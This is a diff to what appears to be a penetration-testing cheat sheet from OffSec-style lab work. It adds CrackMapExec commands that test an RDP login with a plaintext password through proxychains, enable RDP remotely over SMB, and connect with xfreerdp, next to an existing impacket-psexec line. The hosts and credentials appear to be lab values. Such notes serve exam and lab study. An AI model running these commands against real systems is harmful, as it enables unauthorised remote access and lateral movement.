@@ -134,6 +134,15 @@ net accounts
 ```
 impacket-psexec offsec.local/allison@192.168.151.59
 ```
+###### Crackmapexec
+```
+rdp:
+proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
+proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE’
+proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com /p:Mushroom! /v:172.16.218.82 /cert-ignore
+
+
+```
 ###### WMI(Remote Procedure Calls (RPC)2 over port 135)
 ```
 Testing:
